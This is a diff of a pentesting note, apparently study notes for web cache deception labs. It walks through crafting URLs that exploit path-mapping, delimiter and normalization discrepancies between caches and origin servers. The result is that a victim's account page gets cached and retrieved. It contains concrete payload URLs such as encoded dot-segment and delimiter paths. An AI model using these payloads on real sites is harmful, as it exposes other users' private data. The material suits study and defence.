@@ -10,11 +10,11 @@ More info about web cache: [web-cache.md](../web-security/web-cache.md "mention"
 2. Look for discrepancies in how the cache and origin server parse the URL path
 3. Craft a malicious URL to trick the cache into storing a dynamic response. When the victim accesses it, their data is cached. Use Burp to request the same URL and retrieve the cached response. Avoid using a browser to prevent redirects or data invalidation.
 
-## <mark style="color:yellow;">Exploiting static extension cache rules</mark>
+## <mark style="color:yellow;">Static extension cache rules</mark>
 
 Cache rules often target static resources by matching common file extensions like `.css` or `.js`. This is the default behavior in most CDNs.
 
-### <mark style="color:yellow;">Exploiting path mapping discrepancies</mark> <a href="#exploiting-path-mapping-discrepancies" id="exploiting-path-mapping-discrepancies"></a>
+### <mark style="color:yellow;">Path mapping discrepancies</mark> <a href="#exploiting-path-mapping-discrepancies" id="exploiting-path-mapping-discrepancies"></a>
 
 <details>
 
@@ -44,7 +44,7 @@ Consider the following example:
 /my-account/abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
 # Now https://vulnerable.website.com/my-account/abc.js contains your sensitive data cached
 
-# Find a way to send the victim on https://vulnerable.website.com/my-account/xyz.js
+# Find a way to send the victim on http://site.com/my-account/xyz.js
 # Note: I omitted cache buster for for simplicity
 </code></pre>
 
@@ -55,7 +55,7 @@ Consider the following example:
 * Try various extensions, such as `.css`, `.ico`, and `.exe`, as caches may have rules for specific extensions.
 {% endhint %}
 
-### <mark style="color:yellow;">Exploiting delimiter discrepancies</mark> <a href="#exploiting-delimiter-discrepancies" id="exploiting-delimiter-discrepancies"></a>
+### <mark style="color:yellow;">Delimiter discrepancies</mark> <a href="#exploiting-delimiter-discrepancies" id="exploiting-delimiter-discrepancies"></a>
 
 <details>
 
@@ -67,30 +67,29 @@ to do
 
 Objective: identify a character that is used as a delimiter by the origin server but not the cache. Use this list: [https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
 
-```sh
-# 1. Find good endpoint
-/my-account        # Contains sensitive data -> Good endpoint
+<pre class="language-sh"><code class="lang-sh"># 1. Find good endpoint
+http://site.com/my-account        # Contains sensitive data -> Good endpoint
 
 # 2. Check if web cache is used
-/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
-/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
+http://site.com/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+http://site.com/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
 
 # 3. Fuzz delimeter char
-/my-account§§aaa   # Fuzz delimeter char. -> with ";" -> The response matches the original
+http://site.com/my-account§§aaa   # Fuzz delimeter char. -> with ";" -> The response matches the original
 
 # 4. Check if delimiter is not used by the cache
-/my-account        # "X-Cache: miss"
-/my-account;abc.js # "X-Cache: miss"
+http://site.com/my-account        # "X-Cache: miss"
+http://site.com/my-account;abc.js # "X-Cache: miss"
 # The cache thinks "my-account;abc" is the name and ".js" is the extension
 
 # 5. Exploitation
-/my-account;abc.js # 1 time "X-Cache: miss"
-/my-account;abc.js # 2 time "X-Cache: hit"
+<strong>http://site.com/my-account;abc.js # 1 time "X-Cache: miss"
+</strong>http://site.com/my-account;abc.js # 2 time "X-Cache: hit"
 # Now https://vulnerable.website.com/my-account;abc.js contains your sensitive data cached
 
-# Find a way to send the victim on https://vulnerable.website.com/my-account;xyz.js
+# Find a way to send the victim on http://site.com/my-account;xyz.js
 # Note: I omitted cache buster for for simplicity
-```
+</code></pre>
 
 {% hint style="info" %}
 **Note**:&#x20;
@@ -106,7 +105,7 @@ Objective: identify a character that is used as a delimiter by the origin server
 
 to understand
 
-## <mark style="color:yellow;">Exploiting static directory cache rules (Normalization discrepancies)</mark> <a href="#exploiting-static-directory-cache-rules" id="exploiting-static-directory-cache-rules"></a>
+## <mark style="color:yellow;">Static directory cache rules (normalization discrepancies)</mark> <a href="#exploiting-static-directory-cache-rules" id="exploiting-static-directory-cache-rules"></a>
 
 Web servers often store static resources in specific directories. Cache rules typically target these by matching URL path prefixes like `/static`, `/assets`, `/scripts`, or `/images`.
 
@@ -115,61 +114,60 @@ Premise
 * If you type in your browser `https://website/test/../account`, it'll make the following request `GET /account HTTP/2`. &#x20;
 * If you type in your browser`https://website/test/..%2faccount`, it'll make the following request `GET /test/..%2faccount HTTP/2`. &#x20;
 
-```sh
-# 1. Find good endpoint
-/my-account            # Contains sensitive data -> Good endpoint
+<pre class="language-sh"><code class="lang-sh"># 1. Find good endpoint
+http://site.com/my-account            # Contains sensitive data -> Good endpoint
 
 # 2. Check if web cache is used (with static resources)
-/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
-/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
-```
+<strong>http://site.com/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+</strong>http://site.com/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
+</code></pre>
 
-### <mark style="color:yellow;">Exploiting normalization by the origin server</mark> <a href="#exploiting-normalization-by-the-origin-server" id="exploiting-normalization-by-the-origin-server"></a>
+### <mark style="color:yellow;">Normalization by the origin server</mark> <a href="#exploiting-normalization-by-the-origin-server" id="exploiting-normalization-by-the-origin-server"></a>
 
 <pre class="language-sh"><code class="lang-sh"># 3. Confirm that the cache rule is based on the static directory
-/static/../xxx         # 1 time "X-Cache: miss"
-/static/../xxx         # 2 time "X-Cache: hit" -> so all subpages in /static/ will be cached 
+http://site.com/static/../xxx         # 1 time "X-Cache: miss"
+http://site.com/static/../xxx         # 2 time "X-Cache: hit" -> so all subpages in /static/ will be cached 
 
 # 4. Detecting normalization by the origin server
-/aaa/..%2fmy-account    # Returns the profile information -> The origin server decodes the slash and resolves the dot-segment
+http://site.com/aaa/..%2fmy-account    # Returns the profile information -> The origin server decodes the slash and resolves the dot-segment
 
 # 5. Detecting normalization by the cache server
-/static/js/info.js     # 1 time "X-Cache: miss"
-/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
-# So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js
+http://site.com/static/js/info.js     # 1 time "X-Cache: miss"
+<strong>http://site.com/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
+</strong># So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js
 
 # 6. Exploiting
-/static/..%2fmy-account
+http://site.com/static/..%2fmy-account
 
 # The cache interprets the path as: /static/..%2fmy-account
 <strong># The origin server interprets the path as: /my-account
 </strong></code></pre>
 
-### <mark style="color:yellow;">Exploiting normalization by the cache server</mark>
+### <mark style="color:yellow;">Normalization by the cache server</mark>
 
 <pre class="language-sh"><code class="lang-sh"># 3. Confirm that the cache rule is based on the static directory
 # This step is useless, so you can't confirm if the cache decodes 
 # dot-segments and URL paths without trying an exploit.
 <strong>
 </strong><strong># 4. Detecting normalization by the origin server
-</strong>/aaa/..%2fmy-account    # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment
+</strong>http://site.com/aaa/..%2fmy-account    # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment
 
 # 5. Detecting normalization by the cache server
-/static/js/info.js     # 1 time "X-Cache: miss"
-/static/js/info.js     # 2 time "X-Cache: hit"
-/static/js%2finfo.js   # 2 time "X-Cache: hit" -> Cache has normalized the path
+http://site.com/static/js/info.js     # 1 time "X-Cache: miss"
+http://site.com/static/js/info.js     # 2 time "X-Cache: hit"
+http://site.com/static/js%2finfo.js   # 2 time "X-Cache: hit" -> Cache has normalized the path
 # So the cache understand that they are the same path
 
 # 6. Identify a delimiter that is used by the origin server but not the cache
-/my-account§§aaa   # Fuzz delimeter char. -> with "%23" -> The response matches the original
+http://site.com/my-account§§aaa   # Fuzz delimeter char. -> with "%23" -> The response matches the original
 
 # 7. Check if delimiter is not used by the cache 
-/static/js/info.js        # "X-Cache: miss"
-/static/js/info.js%23aaa  # "X-Cache: miss"
+http://site.com/static/js/info.js        # "X-Cache: miss"
+http://site.com/static/js/info.js%23aaa  # "X-Cache: miss"
 # So the cache thinks "info.js" is different from "info.js%23aaa"
 
 # 8. Exploitation
-/my-account%23%2f%2e%2e%2fstatic/js/info.js
+http://site.com/my-account%23%2f%2e%2e%2fstatic/js/info.js
 
 # The cache interprets the path as: /static
 # The origin server interprets the path as: /my-account
